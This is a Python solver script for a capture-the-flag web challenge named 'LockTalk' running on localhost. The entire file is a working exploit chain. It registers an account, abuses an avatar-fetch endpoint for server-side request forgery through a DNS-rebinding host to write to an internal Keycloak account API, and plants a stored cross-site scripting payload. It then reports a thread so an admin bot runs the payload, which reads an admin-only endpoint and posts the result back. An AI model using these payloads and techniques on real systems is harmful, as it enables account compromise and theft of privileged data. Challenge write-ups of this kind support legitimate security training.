#!/usr/bin/env python3

import json
import re
import random
import string
import sys
import threading
import time

import requests

APP       = "http://localhost:3000"
REALM     = "locktalk"
SSRF_HOST = "7f000001.c0b29b8a.rbndr.us"

XSS = (
    "<script>(async()=>{"
    "let b='xss-ok';"
    "try{"
    "const r=await fetch('/api/admin/flag',{credentials:'include'});"
    "if(r.ok){const d=await r.json();b=d.flag||'no-flag-field';}"
    "else b='flag-http-'+r.status;"
    "}catch(e){b='ex:'+e.message.slice(0,30);}"
    "const p=new URLSearchParams({title:'__flag__',body:b});"
    "await fetch('/submit',{method:'POST',credentials:'include',body:p});"
    "})();</script>"
)


def log(msg):  print(f"  [*] {msg}", flush=True)
def ok(msg):   print(f"  [+] {msg}", flush=True)
def die(msg):  print(f"\n  [!] {msg}", file=sys.stderr); sys.exit(1)
def rand(n=8): return "".join(random.choices(string.ascii_lowercase, k=n))


def wait_for_app(timeout=300):
    log("Waiting for LockTalk to be ready (Keycloak takes ~60 s)…")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{APP}/", timeout=5)
            if r.status_code < 500:
                ok("App is up.")
                return
        except requests.exceptions.RequestException:
            pass
        time.sleep(4)
    die(f"App did not become ready within {timeout} s.")


def register_and_login(username, password, email):
    s = requests.Session()
    r = s.post(f"{APP}/register", data={
        "username": username,
        "email":    email,
        "password": password,
        "confirm":  password,
    }, allow_redirects=True)
    r.raise_for_status()

    if "/login" in r.url or ("alert-error" in r.text and "error" in r.text.lower()):
        snippet = re.search(r'alert-error[^>]*>(.*?)<', r.text, re.S)
        msg = snippet.group(1).strip() if snippet else "(no error detail)"
        die(f"Registration failed: {msg}")
    if r.url.endswith("/register"):
        die(f"Registration ended at unexpected URL: {r.url}")

    ok(f"Registered and logged in as '{username}'")
    return s


def get_token(s):
    r = s.get(f"{APP}/api/me")
    r.raise_for_status()
    tok = r.json()["access_token"]
    ok(f"Bearer token: {tok[:24]}…")
    return tok


def ssrf_write_about(s, username, email, token, payload, workers=5, max_runtime=180):
    kc_body = json.dumps({
        "username":   username,
        "email":      email,
        "attributes": {"about": [payload]},
    })
    ssrf_url = f"http://{SSRF_HOST}:8080/realms/{REALM}/account"
    log(f"SSRF target: {ssrf_url}")

    done    = threading.Event()
    counter = [0]
    c_lock  = threading.Lock()

    def worker():
        sess = requests.Session()
        sess.cookies.update(s.cookies)

        while not done.is_set():
            with c_lock:
                counter[0] += 1
                n = counter[0]
            print(f"\r  [*] attempt {n}…   ", end="", flush=True)

            try:
                r = sess.post(f"{APP}/api/settings/avatar/fetch", json={
                    "url":     ssrf_url,
                    "method":  "POST",
                    "headers": json.dumps({
                        "Authorization": f"Bearer {token}",
                        "Content-Type":  "application/json",
                        "Host":          "127.0.0.1:8080",
                    }),
                    "body": kc_body,
                }, timeout=30)
            except Exception:
                continue

            if r.status_code in (400, 502, 503, 504):
                continue
            if not r.ok:
                continue

            resp   = r.json()
            status = resp.get("status")
            if status in (200, 204):
                done.set()
                return

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()

    if not done.wait(timeout=max_runtime):
        print()
        die(f"SSRF write failed after {max_runtime}s")

    print()
    ok("SSRF write succeeded")


def sync_profile(s, username):
    r = s.get(f"{APP}/u/{username}")
    r.raise_for_status()
    m = re.search(r'class="about-body"[^>]*>(.*?)</div>', r.text, re.S)
    if m:
        snippet = m.group(1).strip()[:60]
        ok(f"Profile synced - about content: {snippet}…")
    else:
        log("Warning: 'about-body' div not found; sync may have failed")


def post_thread(s):
    r = s.post(f"{APP}/submit", data={
        "title": "Picked a Kwikset 980 yesterday - tips inside",
        "body":  "Finally got into a Kwikset 980 using an offset hook and "
                 "light tension. The springs are stiffer than on the 400 "
                 "series. Happy to share the exact technique that worked for me.",
    }, allow_redirects=True)
    r.raise_for_status()
    m = re.search(r"/t/(\d+)", r.url)
    if not m:
        die(f"Could not parse thread ID from {r.url}")
    tid = int(m.group(1))
    ok(f"Thread created: /t/{tid}")
    return tid


def report_thread(s, tid):
    r = s.post(f"{APP}/report/thread/{tid}")
    r.raise_for_status()
    d = r.json()
    if not d.get("ok"):
        die(f"Report rejected: {d}")
    ok("Thread reported - admin bot enqueued")


def poll_for_flag(s, timeout=90):
    log(f"Polling for '__flag__' thread (up to {timeout} s)…")
    deadline = time.time() + timeout
    dots = 0
    while time.time() < deadline:
        r = s.get(f"{APP}/")
        if "__flag__" in r.text:
            m = re.search(r'href="/t/(\d+)">__flag__<', r.text)
            if m:
                tr   = s.get(f"{APP}/t/{m.group(1)}")
                flag = re.search(r"GRT26\{[^\}]+\}", tr.text)
                if flag:
                    print()
                    return flag.group(0)
                body_m = re.search(r'class="post-body"[^>]*>(.*?)</div>', tr.text, re.S)
                body = body_m.group(1).strip() if body_m else '(could not parse body)'
                print()
                log(f"__flag__ thread body: {body[:300]}")
                die("Flag regex did not match")
        elapsed = int(timeout - (deadline - time.time()))
        dots = (dots % 3) + 1
        print(f"\r  [*] waiting{'.' * dots}   {elapsed}s elapsed   ", end="", flush=True)
        time.sleep(2)
    print()
    die(f"Timed out after {timeout} s - flag thread never appeared")


def main():
    username = f"sol_{rand()}"
    password = rand(16)
    email    = f"{username}@pwn.local"

    print()
    print("=" * 56)
    print("  LockTalk CTF - solver")
    print("=" * 56)
    log(f"Target  : {APP}")
    log(f"Player  : {username}")
    log(f"Payload : {len(XSS)} chars")
    print()

    wait_for_app()

    print()
    log("--- Phase 1: get foothold ---")
    s     = register_and_login(username, password, email)
    token = get_token(s)

    print()
    log("--- Phase 2: plant XSS via SSRF ---")
    ssrf_write_about(s, username, email, token, XSS)
    sync_profile(s, username)

    print()
    log("--- Phase 3: trigger bot ---")
    tid = post_thread(s)
    report_thread(s, tid)

    print()
    log("--- Phase 4: collect flag ---")
    flag = poll_for_flag(s)

    print()
    print("=" * 56)
    print(f"  FLAG: {flag}")
    print("=" * 56)
    print()


if __name__ == "__main__":
    main()
